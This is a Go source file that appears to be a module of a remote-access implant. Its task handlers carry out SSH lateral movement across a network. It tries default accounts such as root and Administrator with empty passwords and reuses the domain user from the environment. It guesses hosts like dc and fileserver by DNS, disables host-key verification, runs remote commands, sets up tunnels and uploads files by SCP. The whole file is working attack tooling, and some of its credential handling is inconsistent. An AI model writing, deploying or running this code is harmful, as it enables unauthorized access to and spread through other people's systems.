//go:build linux || windows || darwin

package main

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/knownhosts"
)

// SSH connection result
type SSHResult struct {
	Host       string `json:"host"`
	Port       int    `json:"port"`
	User       string `json:"user"`
	AuthMethod string `json:"auth_method"`
	Success    bool   `json:"success"`
	Output     string `json:"output,omitempty"`
	Error      string `json:"error,omitempty"`
}

// Credential types for SSH authentication
type SSHCredential struct {
	User     string `json:"user"`
	Password string `json:"password,omitempty"`
	KeyPath  string `json:"key_path,omitempty"`
	KeyData  string `json:"key_data,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

func handleSSHLateralImpl(task Task, res *TaskResult) {
	// Parse task parameters: host, port, user, auth_type, command
	params := parseSSHParams(task.Command)

	var results []SSHResult

	// Credential acquisition: try multiple credentials
	creds := gatherSSHCredentials(params)

	hosts := resolveSSHTargets(params)
	port := params.port
	if port == 0 {
		port = 22
	}
	command := params.command
	if command == "" {
		command = "whoami"
	}

	for _, host := range hosts {
		for _, cred := range creds {
			result := trySSHConnect(host, port, cred, command)
			results = append(results, result)
			if result.Success {
				break // Don't try other creds if one worked
			}
		}
	}

	// Format output
	var sb strings.Builder
	for _, r := range results {
		status := "❌"
		if r.Success {
			status = "✅"
		}
		sb.WriteString(fmt.Sprintf("%s %s@%s:%d [%s]\n", status, r.User, r.Host, r.Port, r.AuthMethod))
		if r.Output != "" {
			sb.WriteString(r.Output)
			if !strings.HasSuffix(r.Output, "\n") {
				sb.WriteString("\n")
			}
		}
		if r.Error != "" {
			sb.WriteString(fmt.Sprintf("  Error: %s\n", r.Error))
		}
	}
	res.Output = sb.String()
}

type sshParams struct {
	hosts   []string
	port    int
	user    string
	command string
	keyFile string
	creds   string
}

func parseSSHParams(input string) sshParams {
	params := sshParams{
		port:    22,
		command: "whoami",
	}

	// Format: "host1,host2;user:password@host3:port;command=whoami"
	// Or JSON-like: {"hosts":["host1"],"port":22,"user":"admin","command":"whoami","key":"path/to/key"}

	parts := strings.SplitN(input, ";", 3)
	for _, part := range parts {
		if strings.HasPrefix(part, "command=") {
			params.command = strings.TrimPrefix(part, "command=")
		} else if strings.HasPrefix(part, "key=") {
			params.keyFile = strings.TrimPrefix(part, "key=")
		} else if strings.HasPrefix(part, "user=") {
			params.user = strings.TrimPrefix(part, "user=")
		} else if strings.HasPrefix(part, "port=") {
			fmt.Sscanf(part, "port=%d", &params.port)
		} else if strings.HasPrefix(part, "hosts=") {
			params.hosts = strings.Split(strings.TrimPrefix(part, "hosts="), ",")
		} else if strings.Contains(part, "@") {
			// user@host format
			atIdx := strings.LastIndex(part, "@")
			params.user = part[:atIdx]
			rest := part[atIdx+1:]
			if colonIdx := strings.Index(rest, ":"); colonIdx >= 0 {
				params.hosts = append(params.hosts, rest[:colonIdx])
				fmt.Sscanf(rest[colonIdx+1:], "%d", &params.port)
			} else {
				params.hosts = append(params.hosts, rest)
			}
		} else {
			// Plain host
			params.hosts = append(params.hosts, part)
		}
	}

	return params
}

func gatherSSHCredentials(params sshParams) []SSHCredential {
	var creds []SSHCredential

	// Try provided user/password
	if params.user != "" {
		creds = append(creds, SSHCredential{User: params.user, Password: ""})
	}

	// Try key-based auth
	if params.keyFile != "" {
		creds = append(creds, SSHCredential{User: params.user, KeyPath: params.keyFile})
	}

	// Try domain cached creds
	domain := os.Getenv("USERDOMAIN")
	username := os.Getenv("USERNAME")
	if domain != "" && username != "" {
		creds = append(creds, SSHCredential{User: domain + "\\" + username})
	}

	// Try common default creds
	defaultCreds := []SSHCredential{
		{User: "root", Password: ""},
		{User: "admin", Password: ""},
		{User: "Administrator", Password: ""},
	}
	creds = append(creds, defaultCreds...)

	return creds
}

func resolveSSHTargets(params sshParams) []string {
	if len(params.hosts) > 0 {
		return params.hosts
	}
	// Try to resolver from domain/subnet if available
	if domain := os.Getenv("USERDNSDOMAIN"); domain != "" {
		// Attempt DNS resolution
		hosts := tryResolveDomainHosts(domain)
		if len(hosts) > 0 {
			return hosts
		}
	}
	return []string{"127.0.0.1"}
}

func tryResolveDomainHosts(domain string) []string {
	var hosts []string
	commonHosts := []string{
		"dc", "dns", "fileserver", "srv", "mail", "sql",
	}
	for _, h := range commonHosts {
		host := h + "." + domain
		if _, err := net.LookupHost(host); err == nil {
			hosts = append(hosts, host)
		}
	}
	// Try to enumerate via LDAP (reuse existing functions)
	// This is a simplified version
	return hosts
}

func trySSHConnect(host string, port int, cred SSHCredential, command string) SSHResult {
	result := SSHResult{
		Host:       host,
		Port:       port,
		User:       cred.User,
		AuthMethod: "password",
	}

	addr := fmt.Sprintf("%s:%d", host, port)
	config := &ssh.ClientConfig{
		User:            cred.User,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	// Try key-based auth first if available
	if cred.KeyPath != "" || cred.KeyData != "" {
		result.AuthMethod = "key"
		var keyData []byte
		var err error

		if cred.KeyPath != "" {
			keyData, err = os.ReadFile(cred.KeyPath)
			if err != nil {
				result.Error = fmt.Sprintf("key read error: %v", err)
				return result
			}
		} else {
			keyData = []byte(cred.KeyData)
		}

		var signer ssh.Signer
		signer, err = ssh.ParsePrivateKey(keyData)
		if err != nil {
			// Try with passphrase (empty)
			signer, err = ssh.ParsePrivateKeyWithPassphrase(keyData, []byte(""))
			if err != nil {
				result.Error = fmt.Sprintf("key parse error: %v", err)
				return result
			}
		}
		config.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	} else if cred.Password != "" {
		result.AuthMethod = "password"
		config.Auth = []ssh.AuthMethod{ssh.Password(cred.Password)}
	} else {
		// Try agent/SSO
		config.Auth = []ssh.AuthMethod{ssh.Password("")}
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		result.Error = fmt.Sprintf("dial error: %v", err)
		return result
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		result.Error = fmt.Sprintf("session error: %v", err)
		return result
	}
	defer session.Close()

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	session.Stdout = &stdout
	session.Stderr = &stderr

	if err := session.Run(command); err != nil {
		result.Output = stdout.String()
		result.Error = fmt.Sprintf("command error: %v | stderr: %s", err, stderr.String())
		return result
	}

	result.Success = true
	result.Output = stdout.String()

	return result
}

// SSH lateral movement host resolution via knownhosts
func handleSSHKeygenImpl(task Task, res *TaskResult) {
	params := strings.SplitN(task.Command, " ", 2)
	if len(params) < 1 {
		res.Error = "usage: ssh_keygen <host> [user]"
		return
	}

	host := params[0]
	user := "root"
	if len(params) > 1 {
		user = params[1]
	}

	_, err := knownhosts.New("")
	if err != nil {
		_ = err // knownhosts not required for our use
	}

	result := trySSHConnect(host, 22, SSHCredential{User: user}, "id")
	res.Output = fmt.Sprintf("SSH key scan result for %s@%s:\nSuccess: %t\n%s", user, host, result.Success, result.Output)
}

// SSH port forwarding (local → remote)
func handleSSHTunnelImpl(task Task, res *TaskResult) {
	// Format: "host:remote_port:local_port [user]"
	parts := strings.Fields(task.Command)
	if len(parts) < 1 {
		res.Error = "usage: ssh_tunnel host:remote_port:local_port [user]"
		return
	}

	target := parts[0]
	user := "root"
	if len(parts) > 1 {
		user = parts[1]
	}

	colonParts := strings.Split(target, ":")
	if len(colonParts) != 3 {
		res.Error = "invalid target format: host:remote_port:local_port"
		return
	}

	host := colonParts[0]
	remotePort := colonParts[1]
	localPort := colonParts[2]

	addr := fmt.Sprintf("%s:22", host)
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
		Auth:            []ssh.AuthMethod{ssh.Password("")},
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		res.Error = fmt.Sprintf("SSH dial error: %v", err)
		return
	}
	defer client.Close()

	listener, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", remotePort))
	if err != nil {
		res.Error = fmt.Sprintf("SSH listen error: %v", err)
		return
	}
	defer listener.Close()

	res.Output = fmt.Sprintf("SSH tunnel established: localhost:%s → %s:%s via %s@%s", localPort, host, remotePort, user, host)

	// Accept connections in background
	go func() {
		for {
			localConn, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer localConn.Close()
				remoteConn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%s", localPort), 5*time.Second)
				if err != nil {
					return
				}
				defer remoteConn.Close()
				transferData(localConn, remoteConn)
			}()
		}
	}()
}

func transferData(dst, src net.Conn) {
	buf := make([]byte, 4096)
	for {
		n, err := src.Read(buf)
		if err != nil {
			break
		}
		if _, err := dst.Write(buf[:n]); err != nil {
			break
		}
	}
}

// SSH file upload via SCP
func handleSCPUploadImpl(task Task, res *TaskResult) {
	// Format: "host:user:password:local_path:remote_path"
	parts := strings.SplitN(task.Command, ":", 5)
	if len(parts) < 5 {
		res.Error = "usage: scp_upload host:user:password:local_path:remote_path"
		return
	}

	host := parts[0]
	user := parts[1]
	password := parts[2]
	localPath := parts[3]
	remotePath := parts[4]

	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		res.Error = fmt.Sprintf("local file read error: %v", err)
		return
	}

	addr := fmt.Sprintf("%s:22", host)
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		res.Error = fmt.Sprintf("SSH dial error: %v", err)
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		res.Error = fmt.Sprintf("SSH session error: %v", err)
		return
	}
	defer session.Close()

	go func() {
		w, _ := session.StdinPipe()
		defer w.Close()
		fileName := filepath.Base(remotePath)
		fmt.Fprintf(w, "C0644 %d %s\n", len(data), fileName)
		w.Write(data)
		fmt.Fprintf(w, "\x00")
	}()

	if err := session.Run(fmt.Sprintf("scp -t %s", remotePath)); err != nil {
		res.Error = fmt.Sprintf("SCP error: %v", err)
		return
	}

	res.Output = fmt.Sprintf("Uploaded %s (%d bytes) to %s@%s:%s", localPath, len(data), user, host, remotePath)
}
